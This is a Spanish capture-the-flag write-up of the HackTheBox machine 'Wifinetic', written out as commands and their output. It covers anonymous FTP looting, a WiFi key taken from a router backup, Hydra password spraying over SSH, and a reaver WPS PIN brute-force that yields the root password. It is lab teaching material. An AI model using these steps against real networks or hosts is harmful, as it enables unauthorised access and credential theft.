---
title: "Máquina Wifinetic"
description: "Resolución de la máquina Wifinetic de HackTheBox"
tags: ["Password gathering", "WPS", "Capabilities"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/wifinetic/logo.png"
---

Un "router" expone un FTP público en el cual se exponen documentos de una empresa que parecía tener una red WiFi en un equipo utilizando OpenWRT el cual fue migrado a Debian. En esos documentos se encuentra un Backup con la contraseña del anterior punto de acceso que se reutiliza con un usuario llamado "netadmin" en el passwd. Obtendremos la contraseña del usuario Root haciendo un ataque de descifrado WPS contra un punto de acceso que utiliza este protocolo propenso a ataques.

## Reconocimiento

La máquina solo tiene tres puertos abiertos

```bash
# Nmap 7.94 scan initiated Fri Sep 15 18:46:11 2023 as: nmap -sS -Pn -n -vvv -p- --open --min-rate 200 -oN ports 10.10.11.247
Nmap scan report for 10.10.11.247
Host is up, received user-set (1.0s latency).
Scanned at 2023-09-15 18:46:11 -04 for 191s
Not shown: 61306 closed tcp ports (reset), 4226 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Sep 15 18:49:22 2023 -- 1 IP address (1 host up) scanned in 191.27 seconds
```

Por DNS no enumeraremos ya que nisiquiera tenemos un dominio para probar, pero por FTP el acceso anónimo está habilitado y se exponen unos cuantos archivos

```bash
❯ ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:vzon): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
```

Vamos a descárgarnoslo todo

```bash
ftp> mget
(remote-files) .
mget MigrateOpenWrt.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
226 Transfer complete.
4434 bytes received in 0.0158 seconds (274 kbytes/s)
mget ProjectGreatMigration.pdf? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
226 Transfer complete.
2501210 bytes received in 6.88 seconds (355 kbytes/s)
mget ProjectOpenWRT.pdf? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
226 Transfer complete.
60857 bytes received in 0.355 seconds (167 kbytes/s)
mget backup-OpenWrt-2023-07-26.tar? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
226 Transfer complete.
40960 bytes received in 0.352 seconds (114 kbytes/s)
mget employees_wellness.pdf? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
226 Transfer complete.
52946 bytes received in 0.319 seconds (162 kbytes/s)
```

Analizando estos archivos, encontramos un archivo de texto que parece tener en diagramas ASCII fases de reemplazo del sistema OpenWRT con Debian

```bash
❯ cat MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
... [snip]
```

Los documentos PDF parecen tener información de la compañia, y en uno de ellos se da más detalles sobre una migración de OpenWRT a Debian; relacionado directamente con el documento de texto que vimos arriba

![PDF](/assets/writeups/wifinetic/1.png)
*ProjectOpenWRT.pdf*

Este documentos nos dice que el sistema principal será migrado a Debian debido a la robusta paqueteria, soporte y repositorios que tiene sobre OpenWRT. Hablando de esta migración si viste bien también hay un archivo tar con nombre "backup-OpenWrt-2023-07-26", suponiendo que es del antiguo sistema del router de esta compañia podemos empezar a examinar...

## Intrusión

Viendo el contenido del archivo, vemos que es el backup de la carpeta `etc`:

```bash
❯ tar -tf backup-OpenWrt-2023-07-26.tar
./etc/
./etc/config/
./etc/config/system
./etc/config/wireless
./etc/config/firewall
./etc/config/network
./etc/config/uhttpd
./etc/config/dropbear
./etc/config/ucitrack
./etc/config/rpcd
./etc/config/dhcp
./etc/config/luci
./etc/uhttpd.key
./etc/uhttpd.crt
./etc/sysctl.conf
./etc/inittab
... [snip]
```

Extrayéndolo e yendo a la carpeta, vemos unos cuantos archivos

```bash
❯ tar -xf backup-OpenWrt-2023-07-26.tar
❯ cd etc
❯ ls -la
total 72
drwxr-xr-x 7 vzon vzon 4096 sep 11 11:23 .
drwxr-xr-x 3 vzon vzon 4096 sep 20 23:32 ..
drwxr-xr-x 2 vzon vzon 4096 sep 11 11:22 config
drwxr-xr-x 2 vzon vzon 4096 sep 11 11:22 dropbear
-rw-r--r-- 1 vzon vzon  227 jul 26 06:08 group
-rw-r--r-- 1 vzon vzon  110 abr 27 16:28 hosts
-rw-r--r-- 1 vzon vzon  183 abr 27 16:28 inittab
drwxr-xr-x 2 vzon vzon 4096 sep 11 11:22 luci-uploads
drwxr-xr-x 2 vzon vzon 4096 sep 11 11:22 nftables.d
drwxr-xr-x 3 vzon vzon 4096 sep 11 11:22 opkg
-rw-r--r-- 1 vzon vzon  420 jul 26 06:09 passwd
-rw-r--r-- 1 vzon vzon 1046 abr 27 16:28 profile
-rw-r--r-- 1 vzon vzon  132 abr 27 16:28 rc.local
-rw-r--r-- 1 vzon vzon    9 abr 27 16:28 shells
-rw-r--r-- 1 vzon vzon  475 abr 27 16:28 shinit
-rw-r--r-- 1 vzon vzon   80 abr 27 16:28 sysctl.conf
-rw-r--r-- 1 vzon vzon  745 jul 24 15:15 uhttpd.crt
-rw-r--r-- 1 vzon vzon  121 jul 24 15:15 uhttpd.key
```

En la carpeta `config` podemos encontrar un archivo llamado `wireless` que parece tener la configuración de las interfaces de red, la red WiFi... y su contraseña

```bash
❯ cat wireless

config wifi-device 'radio0'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim0'
	option cell_density '0'
	option channel 'auto'
	option band '2g'
	option txpower '20'

config wifi-device 'radio1'
	option type 'mac80211'
	option path 'virtual/mac80211_hwsim/hwsim1'
	option channel '36'
	option band '5g'
	option htmode 'HE80'
	option cell_density '0'

config wifi-iface 'wifinet0'
	option device 'radio0'
	option mode 'ap'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
	option wps_pushbutton '1'

config wifi-iface 'wifinet1'
	option device 'radio1'
	option mode 'sta'
	option network 'wwan'
	option ssid 'OpenWrt'
	option encryption 'psk'
	option key 'VeRyUniUqWiFIPasswrd1!'
```

El archivo `passwd` contiene usuarios por defecto y uno que llama la atención es "netadmin"

```bash
❯ cat passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

Los pie de página de los PDF también contienen nombres de usuario y un dominio, pero este último no nos servirá de mucho ya que no tenemos acceso a otros servicios a parte del FTP o SSH.

![Olivia](/assets/writeups/wifinetic/2.png)

![Samantha](/assets/writeups/wifinetic/3.png)

Podemos armarnos un diccionario con posibles nombres de usuario a probar contra el SSH para ver si conseguimos un usuario que reutilize la contraseña que encontramos de la red WiFi.

```bash
swood93
owalker17
netadmin
```

Usando el Hydra vemos que esta contraseña es válida para el usuario `netadmin`:

```bash
❯ hydra -L users.txt -p 'VeRyUniUqWiFIPasswrd1!' ssh://10.10.11.247
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 13:49:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.247:22/
[22][ssh] host: 10.10.11.247   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 13:49:29

```

Metiéndonos como este usuario al sistema, vemos que tiene la flag en su directorio personal por lo que podemos tomarla.

```bash
❯ /usr/bin/ssh netadmin@10.10.11.247
netadmin@10.10.11.247s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 21 Sep 2023 05:51:20 PM UTC

  System load:  0.25              Users logged in:        0
  Usage of /:   66.1% of 4.76GB   IPv4 address for eth0:  10.10.11.247
  Memory usage: 7%                IPv4 address for wlan0: 192.168.1.1
  Swap usage:   0%                IPv4 address for wlan1: 192.168.1.23
  Processes:    229


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 21 12:11:12 2023 from 10.10.14.107
netadmin@wifinetic:~$ cat user.txt
bee076957ae1c25ac6193edbb5******
```

## Escalada de privilegios

Buscando por binarios que tengan capabilidades especiales puesta, encontramos al `reaver`

```bash
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

Si miramos las interfaces de red, hay unas cuantas que son inusuales...

```bash
netadmin@wifinetic:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:bc:43 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.247/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:bc43/64 scope link 
       valid_lft forever preferred_lft forever
3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 brd 192.168.1.255 scope global wlan0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:0/64 scope link 
       valid_lft forever preferred_lft forever
4: wlan1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.23/24 brd 192.168.1.255 scope global dynamic wlan1
       valid_lft 23170sec preferred_lft 23170sec
    inet6 fe80::ff:fe00:100/64 scope link 
       valid_lft forever preferred_lft forever
5: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
6: hwsim0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
7: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
```

Vamos a darle una explicación a esto; `wlan0` y `wlan1` parecen ser las interfaces de la red WiFi, por las IPs asignadas podemos pensar que una funciona como un gateway y otra como un simple cliente, `wlan2` parece estar en desuso y `hwsim0` junto a `mon0` son interfaces que están en modo monitor. El programa que vimos antes (`reaver`) es una utilidad que sirve para efectuar ataques de fuerza bruta a puntos de acceso que tengan la función WPS activada, para después aprovecharse del mismo protocolo de esta para sacar en texto claro la clave del punto de acceso. Sabiendo esto vamos bien, ¿pero a quién vamos a atacar?

Recuerda que nos hemos metido a un "router", y el "router" anuncia la red WiFi... **por lo que vamos a hacer que la máquina se ataque a ella misma**. La dirección MAC del punto de acceso podemos obtenerla de la interfaz `wlan0`, osease el BSSID `02:00:00:00:00:00`

Lanzando un ataque de fuerza bruta hacia la misma máquina utilizando la interfaz `mon0`, podremos obtener la passphrase de la red WiFi

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b '02:00:00:00:00:00'

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

Esta contraseña también es válida para root, por lo que estando ya podremos tomar la última flag.

```bash
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# cd 
root@wifinetic:~# ls
root.txt  snap
root@wifinetic:~# cat root.txt
7cd0ff377e496502edaf759172******
```

## Extra

El ataque de fuerza bruta no duró mucho debido a que el PIN utilizado en el WPS de la red era uno que estaba en la lista de PINs que Reaver intenta utilizar por defecto, sin embargo en caso de ser un PIN completamente distinto es posible aprovecharse del protocolo WPS para efectuar un ataque de fuerza bruta más rápido debido a que este primero comprueba si la primera mitad del PIN de 8 dígitos es válida y luego la otra mitad. Usando esto es posible reducir el número de intentos en un ataque de fuerza bruta

```bash
# Pasándole solo la mitad del PIN, podemos ver como Reaver se aprovecha de este principio para adivinar el resto.
root@wifinetic:~# reaver -i mon0 -p "1234" -b '02:00:00:00:00:00'

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

Si quieres ver como funciona a nivel técnico esto, [te recomiendo ver este documento](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf)

¿Y cómo diablos una máquina de HackTheBox puede anunciar una red WiFi? te preguntarás; el programa `hostapd` es la respuesta a esa pregunta.

```bash
root@wifinetic:/etc/hostapd# ls -la
total 16
drw-------   2 root root 4096 Aug  8 15:16 .
drwxr-xr-x 107 root root 4096 Sep 21 12:19 ..
-rw-------   1 root root  363 Jul 31 11:03 hostapd.conf
-rw-------   1 root root 3129 Aug 13  2019 ifupdown.sh
root@wifinetic:/etc/hostapd# cat hostapd.conf
interface=wlan0
driver=nl80211
ssid=OpenWrt
wds_sta=1
hw_mode=g
channel=1
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=WhatIsRealAnDWhAtIsNot51121!
wps_state=2
eap_server=1
config_methods=label display push_button keypad
wps_pin_requests=/var/run/hostapd.pin-req
ap_setup_locked=0
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
```

